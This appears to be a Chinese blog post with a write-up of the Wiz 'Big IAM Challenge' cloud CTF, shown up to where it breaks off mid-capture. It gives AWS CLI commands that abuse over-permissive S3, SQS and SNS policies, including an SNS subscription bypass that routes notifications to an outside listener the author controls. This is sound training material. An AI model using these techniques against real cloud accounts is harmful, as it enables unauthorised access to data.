<!DOCTYPE html>
<html lang="zh-CN" color-mode="light">

  <head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <meta name="author" content="KaGty1" />
  <!-- Open Graph Description 简短摘要-->
  
  <!-- 用于搜索引擎的文章摘要 -->
  
  
  
  <title>
    
      WIZCTF The Big IAM Challenges 
      
      
      |
    
     KaGty1 &#39;s Personal Blog
  </title>

  
    <link rel="apple-touch-icon" href="/images/kagty1.jpg">
    <link rel="icon" href="/images/kagty1.jpg">
  

  <!-- Raleway-Font -->
  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">

  <!-- hexo site css -->
  <link rel="stylesheet" href="/css/main.css" />
  <link rel="stylesheet" href="//at.alicdn.com/t/font_1886449_67xjft27j1l.css" />
  <!-- 代码块风格 -->
  
    
<link rel="stylesheet" href="/css/figcaption/mac-block.css">

  

  <!-- jquery3.3.1 -->
  
    <script defer type="text/javascript" src="/plugins/jquery.min.js"></script>
  

  <!-- fancybox -->
  
    <link href="/plugins/jquery.fancybox.min.css" rel="stylesheet">
    <script defer type="text/javascript" src="/plugins/jquery.fancybox.min.js"></script>
  
  
<script src="/js/fancybox.js"></script>


  

  
    <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
  

  <script>
    var html = document.documentElement
    const colorMode = localStorage.getItem('color-mode')
    if (colorMode) {
      document.documentElement.setAttribute('color-mode', colorMode)
    }
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


  <body>
    <div id="app">
      <div class="header">
  <div class="avatar">
    <a href="/">
      <!-- 头像取消懒加载，添加no-lazy -->
      
        <img src="/images/kagty1.jpg" alt="">
      
    </a>
    <div class="nickname"><a href="/">kagty1</a></div>
  </div>
  <div class="navbar">
    <ul>
      
        <li class="nav-item" data-path="/">
          <a href="/">Home</a>
        </li>
      
        <li class="nav-item" data-path="/archives/">
          <a href="/archives/">Archives</a>
        </li>
      
        <li class="nav-item" data-path="/friends/">
          <a href="/friends/">Friends</a>
        </li>
      
    </ul>
  </div>
</div>


<script src="/js/activeNav.js"></script>



      <div class="flex-container">
        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->


  <!-- LaTex Display -->

  
    <script async type="text/javascript" src="/plugins/mathjax/tex-chtml.js"></script>
  
  <script>
    MathJax = {
      tex: {
        inlineMath: [['$', '$'], ['\\(', '\\)']]
      }
    }
  </script>





  <!-- clipboard -->

  
    <script async type="text/javascript" src="/plugins/clipboard.min.js"></script>
  
  
<script src="/js/codeCopy.js"></script>







  

  

  

  
  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
  <div class="container post-details" id="post-details">
    <div class="post-content">
      <div class="post-title">WIZCTF The Big IAM Challenges</div>
      <div class="post-attach">
        <span class="post-pubtime">
          <i class="iconfont icon-updatetime mr-10" title="更新时间"></i>
          2025-03-18 16:22:13
        </span>
        
      </div>
      <div class="markdown-body">
        <p>题目首先给出<code>amazon-s3</code>云存储的 <code>IAM Policy</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:GetObject&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;s3:ListBucket&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:s3:::thebigiamchallenge-storage-9979f4b&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;s3:prefix&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/*&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>拥有遍历<code>Bucket Object</code>的权限 - <code>&quot;Action&quot;: &quot;s3:ListBucket&quot;</code>，使用命令行列出桶中的<code>Object</code></p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws s3api list-objects --bucket thebigiamchallenge-storage<span class="number">-9979</span>f4b</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Contents&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/flag1.txt&quot;</span><span class="punctuation">,</span>   <span class="comment">//发现flag1.txt</span></span><br><span class="line">            <span class="attr">&quot;LastModified&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-05T19:13:53.000Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ETag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\&quot;ee004573d2858ed66abf17d58d350b97\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Size&quot;</span><span class="punctuation">:</span> <span class="number">37</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;StorageClass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;STANDARD&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Key&quot;</span><span class="punctuation">:</span> <span class="string">&quot;files/logo.png&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;LastModified&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2023-06-08T19:18:24.000Z&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;ETag&quot;</span><span class="punctuation">:</span> <span class="string">&quot;\&quot;c57e95e6d6c138818bf38daac6216356\&quot;&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Size&quot;</span><span class="punctuation">:</span> <span class="number">81889</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;StorageClass&quot;</span><span class="punctuation">:</span> <span class="string">&quot;STANDARD&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p>将<code>files/flag1.txt</code>下载到指定目录并读取</p>
<figure class="highlight dsconfig"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&gt; <span class="string">aws</span> <span class="string">s3api</span> <span class="built_in">get-object</span> <span class="built_in">--bucket</span> <span class="string">thebigiamchallenge-storage-9979f4b</span> <span class="built_in">--key</span> <span class="string">files</span>/<span class="string">flag1</span>.<span class="string">txt</span> /<span class="string">tmp</span>/<span class="string">Flag1</span>.<span class="string">txt</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;AcceptRanges&quot;</span>: <span class="string">&quot;bytes&quot;</span>,</span><br><span class="line">    <span class="string">&quot;LastModified&quot;</span>: <span class="string">&quot;Mon, 05 Jun 2023 19:13:53 GMT&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ContentLength&quot;</span>: <span class="string">37</span>,</span><br><span class="line">    <span class="string">&quot;ETag&quot;</span>: <span class="string">&quot;\&quot;</span><span class="string">ee004573d2858ed66abf17d58d350b97</span>\<span class="string">&quot;&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ContentType&quot;</span>: <span class="string">&quot;text/plain&quot;</span>,</span><br><span class="line">    <span class="string">&quot;ServerSideEncryption&quot;</span>: <span class="string">&quot;AES256&quot;</span>,</span><br><span class="line">    <span class="string">&quot;Metadata&quot;</span>: &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">&gt; <span class="string">cat</span> /<span class="string">tmp</span>/<span class="string">Flag1</span>.<span class="string">txt</span></span><br><span class="line">&#123;<span class="string">wiz:exposed-</span><span class="string">storage-risky-as-usual</span>&#125;</span><br></pre></td></tr></table></figure>



<h4 id="Google-Analytics"><a href="#Google-Analytics" class="headerlink" title="Google Analytics"></a>Google Analytics</h4><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2012-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">                <span class="string">&quot;sqs:SendMessage&quot;</span><span class="punctuation">,</span>    <span class="comment">//有发送message的权限</span></span><br><span class="line">                <span class="string">&quot;sqs:ReceiveMessage&quot;</span>  <span class="comment">//有接收message的权限</span></span><br><span class="line">            <span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><code>SQS</code>的队列<code>URL</code>格式如下所示</p>
<figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">https://sqs.<span class="symbol">&lt;region&gt;</span>.amazonaws.<span class="keyword">com</span>/<span class="symbol">&lt;account-id&gt;</span>/<span class="symbol">&lt;queue-name&gt;</span></span><br><span class="line">由Resource拼接可得队列URL为</span><br><span class="line">https://sqs.us-east-<span class="number">1</span>:<span class="number">092297851374</span>.amazonaws.<span class="keyword">com</span>/<span class="number">092297851374</span>/wiz-tbic-analytics-sqs-queue-ca7a1b2</span><br></pre></td></tr></table></figure>

<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="operator">&gt;</span> aws sqs receive-message <span class="operator">-</span>-queue-url https:<span class="operator">//</span>sqs.us-east-<span class="number">1</span>:<span class="number">092297851374</span>.amazonaws.com<span class="symbol">/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;Messages&quot;</span>: [</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="string">&quot;MessageId&quot;</span>: <span class="string">&quot;3bb7e7e8-cde3-4b27-a12f-ee45bc829f05&quot;</span>,</span><br><span class="line">            <span class="string">&quot;ReceiptHandle&quot;</span>: <span class="string">&quot;AQEBg8fNrj+MZfQjht3b1+W2esl7WgyJeKcu532w3T8eyYMCk4nRbDtAe9nkljpLoX0yQAsHqGwZ+5jxEucIRQhzfsEjtakWGa+e9NHhJk/mcgscV6Yu+r5WGx/TYlC</span></span><br><span class="line"><span class="string">9N1g1pAfTnDtxn7iqGHfW7fmnRh/QOCmR2VMoJ4TFvvRb35Bxnd6hPsjLTPp6CsMiPc10SLNvy9y1gzj1g0lCPite2fEL8expTgh50VO7NBFv92Hv8x5z/DHVA/0T16D10EBn5M/P27Sa3Q4pX+SpefHoquH7</span></span><br><span class="line"><span class="string">PlW+PfOGrYfeV0EMvyegLlpM+Q7V0759d/IIt1BkHKMnDY6l1x6gwgxvGE9hwdtqKEm5/53kyqZiGt8cV3fOd/X9uHkKFLXRto7ZCEiWAjITMSxMt6qrMUZHp757srwQZ0iEJtYtEOEiEBrjtEI=&quot;</span>,</span><br><span class="line">            <span class="string">&quot;MD5OfBody&quot;</span>: <span class="string">&quot;4cb94e2bb71dbd5de6372f7eaea5c3fd&quot;</span>,</span><br><span class="line">            <span class="string">&quot;Body&quot;</span>: <span class="string">&quot;&#123;<span class="char escape_">\&quot;</span>URL<span class="char escape_">\&quot;</span>: <span class="char escape_">\&quot;</span>https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html<span class="char escape_">\&quot;</span>, <span class="char escape_">\&quot;</span>User-Agent<span class="char escape_">\&quot;</span>: <span class="char escape_">\&quot;</span>Lynx/2.5329.3258dev.35046 li</span></span><br><span class="line"><span class="string">bwww-FM/2.14 SSL-MM/1.4.3714<span class="char escape_">\&quot;</span>, <span class="char escape_">\&quot;</span>IsAdmin<span class="char escape_">\&quot;</span>: true&#125;&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">    ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>查看<code>receive-message</code>发现<code>Body</code>中的<code>URL</code>参数，访问<code>https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html</code>得到<code>flag</code></p>
<figure class="highlight node-repl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">&gt;</span> <span class="language-javascript">curl <span class="attr">https</span>:<span class="comment">//tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html</span></span></span><br><span class="line">&#123;wiz:you-are-at-the-front-of-the-queue&#125;</span><br></pre></td></tr></table></figure>

<hr>
<p>在前端<code>HTML</code>代码也可以获得<code>QueueURL</code></p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Initialize the Amazon Cognito credentials provider</span></span></span><br><span class="line"><span class="language-javascript">  <span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">region</span> = <span class="string">&#x27;us-east-1&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="property">credentials</span> = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title class_">CognitoIdentityCredentials</span>(&#123;<span class="title class_">IdentityPoolId</span>: <span class="string">&#x27;us-east-1:c6f3eb2e-3cb5-404e-93bc-f0bdf7ad042e&#x27;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Set the region</span></span></span><br><span class="line"><span class="language-javascript"><span class="variable constant_">AWS</span>.<span class="property">config</span>.<span class="title function_">update</span>(&#123;<span class="attr">region</span>: <span class="string">&#x27;us-east-1&#x27;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Create an SQS service object for Web Analytics.</span></span></span><br><span class="line"><span class="language-javascript"><span class="comment">// Log trafic from all users into SQS.</span></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> sqs = <span class="keyword">new</span> <span class="variable constant_">AWS</span>.<span class="title function_">SQS</span>(&#123;<span class="attr">apiVersion</span>: <span class="string">&#x27;2012-11-05&#x27;</span>&#125;);</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript"><span class="keyword">var</span> params = &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">DelaySeconds</span>: <span class="number">0</span>,</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">MessageBody</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="string">&quot;URL&quot;</span>: <span class="variable language_">document</span>.<span class="property">location</span>.<span class="property">href</span>, <span class="string">&quot;User-Agent&quot;</span>: navigator.<span class="property">userAgent</span>, <span class="string">&quot;IsAdmin&quot;</span>: <span class="literal">false</span>&#125;),</span></span><br><span class="line"><span class="language-javascript">  <span class="title class_">QueueUrl</span>: <span class="string">&quot;https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2&quot;</span></span></span><br><span class="line"><span class="language-javascript">&#125;;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">sqs.<span class="title function_">sendMessage</span>(params, <span class="keyword">function</span>(<span class="params">err, data</span>) &#123;</span></span><br><span class="line"><span class="language-javascript">  <span class="keyword">if</span> (err) &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Error&quot;</span>, err);</span></span><br><span class="line"><span class="language-javascript">  &#125; <span class="keyword">else</span> &#123;</span></span><br><span class="line"><span class="language-javascript">    <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Success&quot;</span>, data.<span class="property">MessageId</span>);</span></span><br><span class="line"><span class="language-javascript">  &#125;</span></span><br><span class="line"><span class="language-javascript">&#125;);</span></span><br><span class="line"><span class="language-javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>



<h4 id="Enable-Push-Notification"><a href="#Enable-Push-Notification" class="headerlink" title="Enable Push Notification"></a>Enable Push Notification</h4><figure class="highlight excel"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">(<span class="number">1</span>) Amazon SNS是什么？</span><br><span class="line">Amazon SNS（简单通知服务） 是 AWS 提供的完全托管的消息传递服务，它可以让你轻松地发送消息到多个订阅端（例如应用程序、邮件、短信、HTTP 端点等），实现通知、消息广播等功能。</span><br><span class="line"></span><br><span class="line">(<span class="number">2</span>) Amazon SNS工作原理</span><br><span class="line"><span class="number">1</span>、发布（Publish）：发布者（Publisher）通过 SNS 向一个主题（Topic）发送消息。</span><br><span class="line"><span class="number">2</span>、订阅（Subscribe）：接收者（Subscriber）订阅 SNS 主题，接收主题发送的消息。订阅者可以是：</span><br><span class="line">	电子邮件（Email）</span><br><span class="line">	短信（SMS）</span><br><span class="line">	HTTP/HTTPS 端点</span><br><span class="line">	AWS <span class="built_in">Lambda</span> 函数（可以用来处理消息）</span><br><span class="line">	SQS 队列（可以把消息推送到 SQS 队列进行后续处理）</span><br><span class="line">	应用程序端点（如移动设备的推送通知）</span><br><span class="line"><span class="number">3</span>、通知（Notification）：SNS 将消息推送给所有订阅了该主题的接收端。</span><br></pre></td></tr></table></figure>

<p>给出的<code>SNS</code>的<code>IAM</code>策略如下所示</p>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;Version&quot;</span><span class="punctuation">:</span> <span class="string">&quot;2008-10-17&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Id&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;Statement&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span></span><br><span class="line">        <span class="punctuation">&#123;</span></span><br><span class="line">            <span class="attr">&quot;Sid&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Statement1&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Effect&quot;</span><span class="punctuation">:</span> <span class="string">&quot;Allow&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Principal&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;AWS&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*&quot;</span></span><br><span class="line">            <span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Action&quot;</span><span class="punctuation">:</span> <span class="string">&quot;SNS:Subscribe&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Resource&quot;</span><span class="punctuation">:</span> <span class="string">&quot;arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications&quot;</span><span class="punctuation">,</span></span><br><span class="line">            <span class="attr">&quot;Condition&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                <span class="attr">&quot;StringLike&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span></span><br><span class="line">                    <span class="attr">&quot;sns:Endpoint&quot;</span><span class="punctuation">:</span> <span class="string">&quot;*@tbic.wiz.io&quot;</span></span><br><span class="line">                <span class="punctuation">&#125;</span></span><br><span class="line">            <span class="punctuation">&#125;</span></span><br><span class="line">        <span class="punctuation">&#125;</span></span><br><span class="line">    <span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">订阅命令行格式，<span class="attr">--protocol</span>可以为<span class="built_in">HTTP</span>(s)等不同的协议格式</span><br><span class="line">aws sns subscribe <span class="attr">--topic-arn</span> arn:aws:sns:us-east-<span class="number">1</span>:<span class="number">123456789012</span>:my-topic <span class="attr">--protocol</span> email <span class="attr">--notification-endpoint</span> your-email@example.com</span><br></pre></td></tr></table></figure>

<p>由于<code>&quot;sns:Endpoint&quot;: &quot;*@tbic.wiz.io&quot;</code>导致<code>--notification-endpoint</code>的值必须使用<code>@tbic.wiz.io</code>邮箱，可以使用<code>http</code>协议外带进行绕过</p>
<figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&gt; aws sns subscribe <span class="params">--topic-arn</span> arn<span class="function">:aws</span><span class="function">:sns</span><span class="function">:us-east-1</span><span class="function">:092297851374</span><span class="function">:TBICWizPushNotifications</span> <span class="params">--protocol</span> http <span class="params">--notification-endpoint</span> http:<span class="string">//101.xx.xx.105</span><span class="function">:2333</span>/@tbic.wiz.io</span><br><span class="line"></span><br><span class="line">&#123;</span><br><span class="line">    <span class="string">&quot;SubscriptionArn&quot;</span>: <span class="string">&quot;pending confirmation&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>同时在<code>VPS</code>中监听<code>101.xx.xx.105:2333</code>端口，要先后监听两次，第一次为成功订阅，第二次为接收订阅后返回的信息</p>
<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">//第一次监听</span><br><span class="line"><span class="keyword">POST</span> <span class="string">/@tbic.wiz.io</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">x-amz-sns-message-type</span><span class="punctuation">: </span>SubscriptionConfirmation</span><br><span class="line"><span class="attribute">x-amz-sns-message-id</span><span class="punctuation">: </span>70543ea1-9a61-4d42-af5b-8dd26a1033a8</span><br><span class="line"><span class="attribute">x-amz-sns-topic-arn</span><span class="punctuation">: </span>arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>text/plain; charset=UTF-8</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>1623</span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>101.xx.xx.105:2333</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>Keep-Alive</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Amazon Simple Notification Service Agent</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip,deflate</span><br><span class="line"></span><br><span class="line"><span class="language-nix">&#123;</span></span><br><span class="line"><span 